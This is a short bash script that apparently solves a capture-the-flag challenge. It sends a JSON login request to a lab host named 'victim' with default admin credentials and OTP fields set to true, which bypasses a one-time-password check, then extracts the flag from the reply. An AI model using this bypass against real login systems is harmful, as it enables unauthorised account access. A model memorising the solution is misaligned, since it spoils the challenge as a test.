#!/bin/bash

# Navigate to the Docker Compose directory (adjust the path as necessary)
#apt-get update -y && apt-get install netcat -y
# Start Docker Compose services

# Run the curl command and filter the flag from the response
response=$(curl -s 'victim:80/login.php' --data '{"username":"admin","password":"admin","otp1":true,"otp2":true,"otp3":true}')
flag=$(echo $response | sed -n 's/.*Congrats, here is your flag: \([^"]*\).*/\1/p')

# Echo the flag
echo "$flag"

